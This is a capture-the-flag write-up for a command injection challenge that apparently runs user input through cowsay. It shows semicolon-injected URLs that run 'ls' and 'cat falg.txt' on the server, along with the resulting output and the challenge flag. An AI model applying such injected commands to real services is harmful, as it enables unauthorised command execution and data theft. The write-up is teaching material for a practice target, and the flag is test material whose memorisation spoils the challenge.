# Command Injection Challenge Writeup

## Initial Analysis

Upon examining the `index.js` file, it appears that the input message is relayed to the console. Recognizing this behavior, an opportunity to exploit the website with a semicolon (`;`) arises, as it is a command separator operator.

## Exploiting the Vulnerability

### List Files (ls)

Using the following link with a semicolon injection:

'''link
https://caas.mars.picoctf.net/cowsay/hi;ls
'''


The output reveals the directory contents, indicating the presence of a file named `falg.txt`.

```plaintext
 ____
< hi >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

Read Flag (cat)
Using the following link with a semicolon injection:

```link
https://caas.mars.picoctf.net/cowsay/hi;cat falg.txt
```

The output displays the contents of falg.txt, revealing the flag.

```plaintext ____
< hi >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```

Flag
The flag is extracted from the contents of falg.txt:

'picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}'